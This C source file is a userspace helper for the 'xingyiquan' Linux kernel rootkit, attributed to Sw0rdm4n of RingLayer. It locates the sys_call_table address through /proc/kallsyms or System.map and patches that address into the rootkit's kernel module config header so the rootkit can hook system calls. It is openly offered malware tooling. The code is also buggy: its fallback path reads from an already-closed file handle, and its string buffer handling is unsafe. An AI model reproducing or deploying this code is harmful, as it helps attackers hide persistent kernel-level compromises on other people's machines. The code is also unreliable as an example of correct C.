/*
 * userspace patcher for xingyiquan lkm rootkit
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * Ringlayer Public License Statement V.1
 * 1. This software is free software under copyright of Ringlayer's Public License
 * 2. You may copy / modify / redistribute / share / use this software freely, but you are not allowed to remove copyright / author / url (where you got the source) if you don't modify source code logic at least 50%
 * 3. You are not allowed to sell this source code without permission from author
 * 4. Violation of any terms above means author have some rights for law processing and right to fine 
 *
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>

static char *sys_call_table_addr = NULL;

inline void dx(int second)
{
	int sec;
	
	sec = second * 1000000; 
	usleep(sec);
}

static inline char *n_malloc(int size) 
{
	char *retme = NULL;
	
	if (size > 0) {
		retme = malloc((size_t)(size + 1));
		if (retme != NULL)
			memset(retme, (int)'\0', (size_t)(size + 1));
	}
	if (retme == NULL)
		return (char *)'\0';
	
	return retme;
}

/* made this function on 20:30 pm 29 oct 2014 */
static char *_get_addr_from_full_sym_str(char *full_sym_str)
{
	char *tmp_pcs = NULL;
	char *retme = NULL;

	tmp_pcs = strtok(full_sym_str, " ");
	if (tmp_pcs != NULL) {
		retme = n_malloc((int)strlen(tmp_pcs));
		sprintf(retme, "%s", tmp_pcs);
	}
	strtok(NULL, " ");

	return retme;
}

/* made this function on 20:32 pm 29 oct 2014 */
static char *get_syscall_table()
{
	FILE *pop_kallsyms = NULL, *pop_boot = NULL;
	char *retval = NULL;
	char res[100];
	int _found = 0;

	fprintf(stdout, "[+] searching from /proc/kallsyms\n");
	dx(1);
	pop_kallsyms = popen("cat /proc/kallsyms | grep sys_call_table", "r");
	if (pop_kallsyms != NULL) {
		while ((fgets(res, 100, pop_kallsyms)) != NULL) {
			if ((strstr(res, "sys_call_table") != NULL) && (strstr(res, "ia32") == NULL)) {
				retval = _get_addr_from_full_sym_str((char *)res);
				_found = 1;
				break;
			}  
		}
		pclose(pop_kallsyms);
	}
	if (_found == 0) {
		fprintf(stdout, "[+] searching from System.map\n");
		dx(1);
		pop_boot = popen("cat /boot/System.map-$(uname -r) | grep sys_call_table", "r");			
		if (pop_boot != NULL) {
			while ((fgets(res, 100, pop_kallsyms)) != NULL) {
				if ((strstr(res, "sys_call_table") != NULL) && (strstr(res, "ia32") == NULL)) {
					retval = _get_addr_from_full_sym_str((char *)res);
					_found = 1;
					break;
				}
			}  
			pclose(pop_boot);
		}	
	}
	
	if (_found == 0) {
		fprintf(stdout, "[-] error ! failed to get syscall table address\n");
		exit(-1);
	}
	else
		fprintf(stdout, "[+] found syscall table address %s\n", retval);

	return retval;
}

/* string trimming functions modified from http://en.wikipedia.org/wiki/Trimming_%28computer_programming%29#C.2FC.2B.2B */
static inline char *rtrim(char *str)
{
	int n = 0;
	char *ret_str = NULL;
	
	if (str == NULL) {
		ret_str = "X";
		goto out_rtrim;
	}
	n = (int)strlen(str);
	while (n > 0 && isspace((unsigned char)str[n - 1])) 
		n--;
	str[n] = '\0';
	if (str != NULL) {
		ret_str = n_malloc((int)strlen(str));
		strncpy(ret_str, str, strlen(str));
	}
	if (ret_str == NULL) 
		return (char *)'\0';
	out_rtrim:
	
	return ret_str;
}
 
static inline char *ltrim(char *str)
{
	char *ret_str = NULL;
	int n = 0;
	
	if (str == NULL) {
		ret_str = "X";
		goto out_ltrim;
	}
	ret_str = n_malloc((int)strlen(str));
	strncpy(ret_str, str, strlen(str));
	while (str[n] != '\0' && isspace((unsigned char)str[n])) 
		n++;
	memmove(ret_str, str + n, strlen(str) - n + 1);
	if (ret_str == NULL)
		return (char *)'\0';
	out_ltrim:
	
	return ret_str;
}
 
static inline char *trim(char *str)
{
	char *ret_str = NULL, *bef_ret = NULL, *final_ret = NULL;
	
	if (str != NULL) {
		if ((str[0] != '\0') && (str[0] != '\x00')) {
			if (sizeof(str) > 0) {
				ret_str = rtrim(str);
				bef_ret = ltrim(ret_str);
			}
		}
		if (bef_ret != NULL) 
			final_ret = bef_ret;
		else {
			final_ret = n_malloc((int)strlen(str));
			strncpy(final_ret, str, strlen(str));
		}
	}
	else 
		return (char *)'\0';
	if (final_ret == NULL)
		return (char *)'\0';
		
	return final_ret;
}

/* replace_string function was modified from http://www.performancecompetence.com/wordpress/?p=440 */
static inline char* replace_string(char *full_str,char *old_str, char *new_str)
{
	static char buffer[4096];
	char *p;
	
	if(!(p = strstr(full_str, old_str)))  
		return full_str;
	strncpy(buffer, full_str, p - full_str); 
	buffer[p - full_str] = '\0';
	snprintf(buffer + (p - full_str), sizeof(buffer) + sizeof(p - full_str) ,"%s%s", new_str, p + strlen(old_str));

	return buffer;
}

int main()
{
	char *str_to_replace = "c05d2180";
	FILE *fp = NULL, *fp2 = NULL;
	char *data = NULL;
	int _repl = 0;
	int _correct_source_code = 0;

	data = n_malloc(4096);
	sys_call_table_addr = get_syscall_table();
	system("/bin/cp -rf xingyi_kernel_src/xingyi_lkm_config_orig.h xingyi_kernel_src/xingyi_lkm_config.h.bak;/bin/rm -f xingyi_kernel_src/xingyi_lkm_config.h");
	fp = fopen("xingyi_kernel_src/xingyi_lkm_config.h.bak", "r");
	fp2 = fopen("xingyi_kernel_src/xingyi_lkm_config.h", "w");
	if (fp != NULL && fp2 != NULL) {
		while ((fgets(data, 4095, fp)) != NULL) {
			if (strstr(data, str_to_replace)) {
				data = trim(data);
				data = replace_string(data , str_to_replace, sys_call_table_addr);
				_repl = 1;
				_correct_source_code = 1;
			}	
			if (_repl == 1) {
				fprintf(stdout, "[+] replacing syscall table address on lkm source code\n");	
				dx(1);
				fprintf (fp2, "%s\n", data);
				_repl = 0;
			}
			else
				fprintf(fp2, "%s", data);					
		}
		fclose(fp2);
		fclose(fp);
	}
	if (_correct_source_code == 0) 
		fprintf(stdout, "[-] error incorrect source code at xingyi_kernel_src/xingyi_lkm_config.h\n");
	else
		fprintf(stdout, "[+] done ! patching lkm source code, your lkm source code is ready\n");
	
	return 0;
}

